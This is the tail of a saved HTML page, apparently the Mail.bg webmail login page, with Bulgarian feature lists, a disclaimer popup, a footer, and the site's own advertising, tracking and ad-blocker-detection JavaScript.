                <span class="login_fetures_image features_encryption"></span>
                <h5 class="login_fetures_title">
                    Изключителна сигурност                </h5>
                <ul class="login_fetures_list">
                    <li class="login_fetures_list_item">
                        Изключителна СПАМ защита                    </li>
                    <li class="login_fetures_list_item">
                        Вграден анти ВИРУС                    </li>
                                        <li class="login_fetures_list_item">
                        Вписан в АнтиСПАМ регистъра на КЗП
                    </li>
                                    </ul>
                <div class="float_dummy"></div>
            </div>
            <div class="login_feature">
                <span class="login_fetures_image features_spelling"></span>
                <h5 class="login_fetures_title">
                    И още                </h5>
                <ul class="login_fetures_list">
                    <li class="login_fetures_list_item">
                        Снимки (аватари) в писма и контакти                    </li>
                                        <li class="login_fetures_list_item">
                        Безплатна поща на твой домейн                    </li>
                                        <li class="login_fetures_list_item">
                        Прилагане на няколко файла наведнъж                    </li>
                                    </ul>
                <div class="float_dummy"></div>
            </div>
            <div class="float_dummy"></div>
        </div>
        <div class="login_features">
            <div class="login_feature">
                <span class="login_fetures_image features_mini"></span>
                <h5 class="login_fetures_title">
                    Достъп отвсякъде                </h5>
                <ul class="login_fetures_list">
                    <li class="login_fetures_list_item">
                        Интерфейс адаптиращ се към таблети и телефони                        <div class="tag tag_right color1">
                            <span class="tag_name">
                                Ново                            </span>
                        </div>
                    </li>
                    <li class="login_fetures_list_item">
                        Безплатни IMAP/POP3/SMTP през SSL (след активация)                    </li>
                    <li class="login_fetures_list_item">
                        IMAP с PUSH за мобилни устройства                    </li>
                </ul>
                <div class="float_dummy"></div>
            </div>
            <div class="login_feature">
                <span class="login_fetures_image features_shortcuts"></span>
                <h5 class="login_fetures_title">
                    Уникален интерфейс                </h5>
                <ul class="login_fetures_list">
                    <li class="login_fetures_list_item">
                        Етикети за писмата                    </li>
                                        <li class="login_fetures_list_item">
                        Виртуална БДС/Фонетична клавиатура
                    </li>
                                        <li class="login_fetures_list_item">
                        Бързи клавиши (шорткъти)                    </li>
                </ul>
                <div class="float_dummy"></div>
            </div>
            <div class="float_dummy"></div>
        </div>
    </div>
    </div>

<div id="option" class="popup picture_browser" style="display: none;">
    <div class="round_box login">
        <div class="round_box_content">
            <div class="round_box_top">
                <span class="round_box_tl"></span>
                <span class="round_box_tr"></span>
            </div>
            <div class="round_box_header_small">
                <h3>По-малко кликове, по-бърз достъп</h3>
            </div>
            <table cellspacing="0">
                <tbody><tr>
                    <td class="popup_icon">
                        <span class="message_icon mi_popup big_question"></span>
                    </td>
                    <td>
                        <p class="popup_text"></p>
                    </td>
                </tr>
            </tbody></table>
            <div class="contacts_edit_footer">
                <a href="javascript:;" class="button small" onclick="">
                    ПРОДЪЛЖИ                </a>
                <a href="javascript:;" class="contacts_edit_cancel" onclick="HidePopup(this.parentNode);
                                      return false;">
                    Откажи                </a>
            </div>
            <div class="round_box_bottom">
                <span class="round_box_bl"></span>
                <span class="round_box_br"></span>
            </div>
        </div>
    </div>
</div>

<div style="display: none;">
    </div>



<!-- LOGIN BOTTOM END -->

<!-- ADWORDS CONVERSION CODE -->
<!-- ADWORDS CONVERSION CODE END -->


    <div id="footer" class="footer_simple">
                <div id="footer_left">
            © 2022 Mail.bg        </div>

        <div id="footer_right">
            <div class="pipe_menu">
                                                                <a id="footer-barid-com-link" class="pipe_menu_item_right" href="http://barid.com/" target="_blank">Barid.com</a>
                                                <a id="footer-mail-com-tr-link" class="pipe_menu_item_right" href="http://mail.com.tr/" target="_blank">Mail.com.tr</a>
                                                <a id="footer-radar-bg-link" class="pipe_menu_item_right" href="http://radar.bg/" target="_blank">Radar.bg</a>
                                                                <a id="footer-about-us-link" class="pipe_menu_item_right" href="http://corp.mail.bg/" target="_blank">
                    За нас                </a>
                                                <a id="footer-advert-link" class="pipe_menu_item_right" href="http://corp.mail.bg/?page_id=36" target="_blank">
                    Реклама                </a>
                                                <a id="footer-terms-link" class="pipe_menu_item_right" href="https://mail.bg/terms" target="_blank">
                    Общи условия                </a>
                                                <a id="footer-help-link" class="pipe_menu_item_right" href="javascript:;" onclick="loadScript('/js/help-4.js');">Помощ</a>
                            </div>
        </div>
    </div>
    <div id="site-disclaimer" class="popup login_popup" style="display: none;">
        <div class="round_box login">
            <div class="round_box_header_small">
                <h3>Disclaimer:</h3>
            </div>
            <table cellspacing="0">
                <tbody><tr>
                    <td class="popup_icon">
                        <span class="message_icon mi_popup big_error"></span>
                    </td>
                    <td>
                        <p class="popup_text">
                            Съдържанието, публикувано на този сайт е собственост на МЕЙЛ БГ ЕАД
(ЕИК: 175219991).<br>
<br>
Разрешено е публикуване на елементи (фрагменти от текст, изображения, картинки,
документи и др.) до колкото това не причинява вреди на МЕЙЛ БГ ЕАД или неговите
партньори и/или техни услуги. При използване на елементи от сайта, следва те да
бъдат използвани в контекст, който идентифицира mail.bg(и респективно МЕЙЛ БГ ЕАД) като източник и задължително предоставя линк към
съдържанието в mail.bg. Начинът на отваряне
на линка не следва да въвежда потребителя в заблуждение по отношение на МЕЙЛ БГ
ЕАД и/или неговите партньори и техните услуги, да не го ограничава във фреймове
или да го обвързва по друг начин с чужд на МЕЙЛ БГ ЕАД и/или неговите
партньори интерфейс.<br>
<br>
За друго използване на съдържанието, което не е изрично упоменато в този текст
или Общите Условия за ползване на услугите на МЕЙЛ БГ ЕАД, следва да бъде
получено изрично писмено съгласие от законен представител на МЕЙЛ БГ ЕАД.
                        </p>
                    </td>
                </tr>
            </tbody></table>
            <div class="contacts_edit_footer">
                <a href="javascript:;" class="button small" onclick="">
                    OK                </a>
            </div>
        </div>
    </div>
<a href="https://adsy.mail.bg/1x1.gif?visitor_id=1634121417-0-6154711257855116397&amp;ticket=1634121417-0-6154711257855116397&amp;event_id=3983369053&amp;channel=35&amp;creative=4450&amp;campaign=2079&amp;tag=&amp;name=click&amp;value=1&amp;next=https%3A%2F%2Fcoolfit.bg%2F&amp;js_ver=1.1" target="_blank" id="branding_content_link" class="branding_content_link"></a></div>

<!-- Radar v2 -->

<script type="text/javascript">
    //<!--
    var server_domain = 'mail.bg';    //-->
</script>
<script type="text/javascript">
    //<!--
    var google_analytics_key = 'UA-5624009-2';window.google_analytics_uacct = 'UA-5624009-2';    //-->
</script>
<!-- DFP -->
<script>
// Load GPT
var googletag = googletag || {};
googletag.cmd = googletag.cmd || [];
(function () {
    var gads = document.createElement('script');
    gads.async = true;
    var useSSL = 'https:' == document.location.protocol;
    gads.src = (useSSL ? 'https:' : 'http:')
             + '//www.googletagservices.com/tag/js/gpt.js';
    var node = document.getElementsByTagName('script')[0];
    node.parentNode.insertBefore(gads, node);
})();
googletag.cmd.push(function() {
    // Infinite scroll requires SRA
    googletag.pubads().enableSingleRequest();

    // Disable initial load, we will use refresh() to fetch ads.
    // Calling this function means that display() calls just
    // register the slot as ready, but do not fetch ads for it.
    googletag.pubads().disableInitialLoad();

    // Enable services
    googletag.enableServices();
});
var DFP = {};
DFP.slotid = 0;
</script>

<!-- AdSy -->
<script>
if ( ! Mail) {
    var Mail = {};
}
if ( ! Mail.Ads) {
    Mail.Ads = {};
}
var Adsy = {};
Mail.Ads.loadAdsy = function () {
    // context
    Adsy.context = {};
    Adsy.context.domain = 'mail.bg';
    Adsy.context.lang = 'bg';
    if (Mail.Ads.adBlockPlus) {
        Adsy.context.abp = Mail.Ads.adBlockPlus;
    }

    // bidding settings
    Adsy.context.prebid = {};
    Adsy.context.prebid.TIMEOUT = 700;
    Adsy.context.prebid.adUnits = [];
    Adsy.context.prebid.RELOAD_TIMEOUT_S = 150;

    Adsy.context.prebid.adUnits[0] = {};
    Adsy.context.prebid.adUnits[0].code = '300x250';
    Adsy.context.prebid.adUnits[0].mediaTypes = {};
    Adsy.context.prebid.adUnits[0].mediaTypes.banner = {};
    Adsy.context.prebid.adUnits[0].mediaTypes.banner.sizes = [300, 250];
    //Adsy.context.prebid.adUnits[0].sizes = [300, 250];
    Adsy.context.prebid.adUnits[0].bids = [];
    Adsy.context.prebid.adUnits[0].bids[0] = {};
    Adsy.context.prebid.adUnits[0].bids[0].bidder = 'criteo';
    Adsy.context.prebid.adUnits[0].bids[0].params = {};
    Adsy.context.prebid.adUnits[0].bids[0].params.zoneId = '797151';

    // channel settings
    Adsy.channelSettings = {};
    Adsy.channelSettings[35] = {};
    Adsy.channelSettings[35].hideOthers = false;
    Adsy.channelSettings[35].hideSpecified = [6];

    // load js
    var adsyjs = document.createElement('script');
    adsyjs.setAttribute('src', '//adsy.mail.bg/js/b.js');
    document.getElementsByTagName('head')[0].appendChild(adsyjs);
}
</script>

<!-- AdBlock detection -->
<script>
/*
 * FuckAdBlock 3.2.1
 * Copyright (c) 2015 Valentin Allaire <valentin.allaire@sitexw.fr>
 * Released under the MIT license
 * https://github.com/sitexw/FuckAdBlock
 */

(function(window) {
    var FuckAdBlock = function(options) {
        this._options = {
            checkOnLoad:        false,
            resetOnEnd:            false,
            loopCheckTime:        50,
            loopMaxNumber:        5,
            baitClass:            'pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links',
            baitStyle:            'width: 1px !important; height: 1px !important; position: absolute !important; left: -10000px !important; top: -1000px !important;',
            debug:                false
        };
        this._var = {
            version:            '3.2.1',
            bait:                null,
            checking:            false,
            loop:                null,
            loopNumber:            0,
            event:                { detected: [], notDetected: [] }
        };
        if(options !== undefined) {
            this.setOption(options);
        }
        var self = this;
        var eventCallback = function() {
            setTimeout(function() {
                if(self._options.checkOnLoad === true) {
                    if(self._options.debug === true) {
                        self._log('onload->eventCallback', 'A check loading is launched');
                    }
                    if(self._var.bait === null) {
                        self._creatBait();
                    }
                    setTimeout(function() {
                        self.check();
                    }, 1);
                }
            }, 1);
        };
        if(window.addEventListener !== undefined) {
            window.addEventListener('load', eventCallback, false);
        } else {
            window.attachEvent('onload', eventCallback);
        }
    };
    FuckAdBlock.prototype._options = null;
    FuckAdBlock.prototype._var = null;
    FuckAdBlock.prototype._bait = null;

    FuckAdBlock.prototype._log = function(method, message) {
        console.log('[FuckAdBlock]['+method+'] '+message);
    };

    FuckAdBlock.prototype.setOption = function(options, value) {
        if(value !== undefined) {
            var key = options;
            options = {};
            options[key] = value;
        }
        for(var option in options) {
            this._options[option] = options[option];
            if(this._options.debug === true) {
                this._log('setOption', 'The option "'+option+'" he was assigned to "'+options[option]+'"');
            }
        }
        return this;
    };

    FuckAdBlock.prototype._creatBait = function() {
        var bait = document.createElement('div');
            bait.setAttribute('class', this._options.baitClass);
            bait.setAttribute('style', this._options.baitStyle);
        this._var.bait = window.document.body.appendChild(bait);

        this._var.bait.offsetParent;
        this._var.bait.offsetHeight;
        this._var.bait.offsetLeft;
        this._var.bait.offsetTop;
        this._var.bait.offsetWidth;
        this._var.bait.clientHeight;
        this._var.bait.clientWidth;

        if(this._options.debug === true) {
            this._log('_creatBait', 'Bait has been created');
        }
    };
    FuckAdBlock.prototype._destroyBait = function() {
        window.document.body.removeChild(this._var.bait);
        this._var.bait = null;

        if(this._options.debug === true) {
            this._log('_destroyBait', 'Bait has been removed');
        }
    };

    FuckAdBlock.prototype.check = function(loop) {
        if(loop === undefined) {
            loop = true;
        }

        if(this._options.debug === true) {
            this._log('check', 'An audit was requested '+(loop===true?'with a':'without')+' loop');
        }

        if(this._var.checking === true) {
            if(this._options.debug === true) {
                this._log('check', 'A check was canceled because there is already an ongoing');
            }
            return false;
        }
        this._var.checking = true;

        if(this._var.bait === null) {
            this._creatBait();
        }

        var self = this;
        this._var.loopNumber = 0;
        if(loop === true) {
            this._var.loop = setInterval(function() {
                self._checkBait(loop);
            }, this._options.loopCheckTime);
        }
        setTimeout(function() {
            self._checkBait(loop);
        }, 1);
        if(this._options.debug === true) {
            this._log('check', 'A check is in progress ...');
        }

        return true;
    };
    FuckAdBlock.prototype._checkBait = function(loop) {
        var detected = false;

        if(this._var.bait === null) {
            this._creatBait();
        }

        if(window.document.body.getAttribute('abp') !== null
        || this._var.bait.offsetParent === null
        || this._var.bait.offsetHeight == 0
        || this._var.bait.offsetLeft == 0
        || this._var.bait.offsetTop == 0
        || this._var.bait.offsetWidth == 0
        || this._var.bait.clientHeight == 0
        || this._var.bait.clientWidth == 0) {
            detected = true;
        }
        if(window.getComputedStyle !== undefined) {
            var baitTemp = window.getComputedStyle(this._var.bait, null);
            if(baitTemp && (baitTemp.getPropertyValue('display') == 'none' || baitTemp.getPropertyValue('visibility') == 'hidden')) {
                detected = true;
            }
        }

        if(this._options.debug === true) {
            this._log('_checkBait', 'A check ('+(this._var.loopNumber+1)+'/'+this._options.loopMaxNumber+' ~'+(1+this._var.loopNumber*this._options.loopCheckTime)+'ms) was conducted and detection is '+(detected===true?'positive':'negative'));
        }

        if(loop === true) {
            this._var.loopNumber++;
            if(this._var.loopNumber >= this._options.loopMaxNumber) {
                this._stopLoop();
            }
        }

        if(detected === true) {
            this._stopLoop();
            this._destroyBait();
            this.emitEvent(true);
            if(loop === true) {
                this._var.checking = false;
            }
        } else if(this._var.loop === null || loop === false) {
            this._destroyBait();
            this.emitEvent(false);
            if(loop === true) {
                this._var.checking = false;
            }
        }
    };
    FuckAdBlock.prototype._stopLoop = function(detected) {
        clearInterval(this._var.loop);
        this._var.loop = null;
        this._var.loopNumber = 0;

        if(this._options.debug === true) {
            this._log('_stopLoop', 'A loop has been stopped');
        }
    };

    FuckAdBlock.prototype.emitEvent = function(detected) {
        if(this._options.debug === true) {
            this._log('emitEvent', 'An event with a '+(detected===true?'positive':'negative')+' detection was called');
        }

        var fns = this._var.event[(detected===true?'detected':'notDetected')];
        for(var i in fns) {
            if(this._options.debug === true) {
                this._log('emitEvent', 'Call function '+(parseInt(i)+1)+'/'+fns.length);
            }
            if(fns.hasOwnProperty(i)) {
                fns[i]();
            }
        }
        if(this._options.resetOnEnd === true) {
            this.clearEvent();
        }
        return this;
    };
    FuckAdBlock.prototype.clearEvent = function() {
        this._var.event.detected = [];
        this._var.event.notDetected = [];

        if(this._options.debug === true) {
            this._log('clearEvent', 'The event list has been cleared');
        }
    };

    FuckAdBlock.prototype.on = function(detected, fn) {
        this._var.event[(detected===true?'detected':'notDetected')].push(fn);
        if(this._options.debug === true) {
            this._log('on', 'A type of event "'+(detected===true?'detected':'notDetected')+'" was added');
        }

        return this;
    };
    FuckAdBlock.prototype.onDetected = function(fn) {
        return this.on(true, fn);
    };
    FuckAdBlock.prototype.onNotDetected = function(fn) {
        return this.on(false, fn);
    };

    window.FuckAdBlock = FuckAdBlock;

    if(window.fuckAdBlock === undefined) {
        window.fuckAdBlock = new FuckAdBlock({
            checkOnLoad: true,
            resetOnEnd: true
        });
    }
})(window);
</script>
<script>
Mail.Ads.adBlockPlus = false;
Mail.Ads.adBlockPlusDetected = function () {
    Mail.Ads.adBlockPlus = true;
    Mail.Ads.loadAdsy();
}
if (typeof fuckAdBlock === 'undefined') {
    Mail.Ads.adBlockPlusDetected();
    Mail.Ads.loadAdsy();
} else {
    fuckAdBlock.setOption({ checkOnLoad: false });
    fuckAdBlock.onDetected(Mail.Ads.adBlockPlusDetected).onNotDetected(Mail.Ads.loadAdsy);
    fuckAdBlock.check();
}
</script>

<a class="hidden" href="mailto:aaa@mail.bg">aaa@mail.bg</a>
<a class="hidden" href="mailto:11master00@mail.bg">11master00@mail.bg</a>
<a class="hidden" href="mailto:mailmaster@mail.bg">mailmaster@mail.bg</a>
<a class="hidden" href="mailto:11admin00@mail.bg">11admin00@mail.bg</a>
<script>
        if(document.body.clientWidth < 580){
        (function(document, window) {
            var i = 0;
            let banner_128 = '';
            let banner_6 = '';
            let trough = 0;
            while (!banner_128 && !banner_6 && i < 14) {
                (function(i) {
                    setTimeout(function() {
                        banner_128 = document.getElementById('adsy-128');
                        banner_6 = document.getElementById('adsy-6');
                        if (trough==0 && banner_128 && banner_6) {
                            loadDiffAd(banner_128, banner_6);
                            trough = 1;
                        }
                    }, 200 * i)
                })(i++)
            }
        })(document, window);

        function tryAgain(e) {
            if (!document.getElementById('CleverCoreLoader56906')) {
                return;
            }
            var t = document.getElementById('clever-56906-leader-board-iframe');
            if (t !== null && t.src !== '') t.src = '//sender.clevernt.com/transporter/56906.php?ppuc=1&ppu=0&id=575098&ref=aHR0cHM6Ly9iZXRhLm1haWwuYmcvaWR4I21haW'
            var i = 0;
            while (i < 7 && t === null) {
                (function(i) {
                    setTimeout(function() {
                        t = document.getElementById('clever-56906-leader-board-iframe');
                        if (t && t.src == '') {
                            t.src = '//sender.clevernt.com/transporter/56906.php?ppuc=1&ppu=0&id=575098&ref=aHR0cHM6Ly9iZXRhLm1haWwuYmcvaWR4I21haWxib3gvaW5ib3g%3'
                        }
                    }, 200 * i)
                })(i++)
            }
        }
        function loadDiffAd(banner_128, banner_6) {
            console.log(banner_128, banner_6);
            if (banner_128.children.length == 0 && banner_6.children.length == 0) {
                banner_6.style.display = 'block';
                document.getElementById('adsy-6').innerHTML = '<div class="clever-core-ads"></div>';
                console.log(banner_6.innerHTML);
                //banner_6.removeAttribute('dfp_code');
                var a, c = document.createElement("script");

                c.id = "CleverCoreLoader56906";
                c.src = "https://mail.bg//scripts.cleverwebserver.com/b19bfb52fda2aa9c26c9d0858e03b0cc.js";

                c.async = 0;
                c.type = "text/javascript";
                c.setAttribute("data-target", window.name);
                c.setAttribute("data-callback", "test");

                try {
                    a = parent.document.getElementsByTagName("script")[0] || document.getElementsByTagName("script")[0];
                } catch (e) {
                    a = 0;
                }
                a || (a = document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]);
                a.parentNode.insertBefore(c, a);
            }
        }
        }
    </script>


<script src="https://adsy.mail.bg/get?domain=mail.bg&amp;lang=bg&amp;prebid=%5Bobject%20Object%5D&amp;visitor_id=1634121417-0-6154711257855116765&amp;ticket=1634121417-0-6154711257855116397&amp;screen_width=1920&amp;screen_height=1080&amp;viewport_width=1903&amp;viewport_height=969&amp;flash=0&amp;browser_lang=bg&amp;referrer=&amp;cb=672166&amp;chan=35&amp;chan=58&amp;chan=6" async=""></script>
</body>
</html>
